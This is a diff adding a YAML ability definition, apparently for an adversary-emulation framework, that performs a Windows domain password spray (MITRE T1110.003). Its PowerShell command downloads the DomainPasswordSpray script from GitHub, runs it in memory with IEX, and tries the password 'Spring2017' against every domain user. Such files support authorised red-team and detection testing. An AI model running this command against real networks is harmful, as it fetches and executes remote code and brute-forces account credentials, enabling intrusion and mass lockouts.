@@ -1,0 +1,26 @@
+---
+- id: c285cfeaf0c226d3d2b3812726dbe3a8
+  name: Password Spray (DomainPasswordSpray)
+  description: 'Perform a domain password spray using the DomainPasswordSpray tool.
+    It will try a single password against all users in the domain
+
+
+    https://github.com/dafthack/DomainPasswordSpray
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1110.003
+    name: 'Brute Force: Password Spraying'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (IWR ''https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1''
+          -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain
+          $Env:USERDOMAIN -Force'
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
